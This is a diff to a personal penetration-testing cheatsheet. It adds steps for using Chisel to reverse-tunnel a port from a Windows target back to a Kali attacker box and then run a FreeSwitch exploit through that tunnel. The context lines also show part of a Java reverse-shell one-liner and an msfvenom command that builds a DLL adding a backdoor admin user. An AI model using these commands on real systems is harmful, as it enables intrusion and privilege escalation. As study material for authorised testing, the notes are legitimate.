@@ -1,5 +1,5 @@
 # My Notes / Cheatsheet
-### Last Updated: 12 Nov 2021
+### Last Updated: 17 Nov 2021
 Notes related to Vuln Assmnt/PenTesting 
 
 #### Approach for Compromising a box
@@ -397,6 +397,14 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ##### PATH issues on Windows
 > 1. ```c:\windows\system32\whoami.exe```
 > 1. ```c:\windows\system32\ipconfig.exe```
+	
+##### Chisel
+> 1. Download ```git clone https://github.com/jpillora/chisel.git```
+> 1. Go inside Chisel folder & Install ```go build -ldflags="-s -w"```
+> 1. Run server on **Kali Linux** ```./chisel server --reverse --port 8888```
+> 1. Run client on **Windows*** ```chisel.exe client 192.168.10.106:8888 R:8021:127.0.0.1:8021```
+> 1. Above command is going to forward port 8021 to Kali box
+> 1. E.g FreeSwitch exploit can be run ```./freeswitch-exploit.py localhost whoami```
 	
 ##### Windows add user 'hacker' with 'admin' privs and become 'nt authority\system' 
 > 1. msfvenom -p windows/adduser USER='hacker' PASS='Hacker123$' -f dll > version.dll
